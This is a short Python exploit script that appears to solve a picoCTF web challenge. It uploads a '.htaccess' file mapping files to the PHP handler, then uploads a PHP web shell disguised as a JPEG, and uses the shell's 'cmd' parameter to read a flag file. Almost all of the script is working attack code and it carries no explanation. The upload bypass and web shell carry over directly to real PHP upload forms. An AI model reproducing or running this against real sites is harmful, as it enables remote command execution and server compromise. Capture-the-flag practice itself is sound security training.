import requests
import re

url = "http://amiable-citadel.picoctf.net:64385"
s = requests.Session()

def send_file(filename, content, type):
    res = s.post(f'{url}/upload.php', files={
        'image': (filename, content, type)
    })

    return res.text

# htaccess exploit
payload = 'SetHandler php-script'

res = send_file('.htaccess', payload, 'text/plain')

# upload webshell

payload = '''<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>'''

res = send_file('exploit.jpg', payload, 'image/jpeg')

path = re.findall(r'href=\'(.+)\'', res)[0]

# # rce
payload = 'cat ../../flag.txt'

res = s.get(f'{url}/{path}?cmd={payload}')
print(res.text)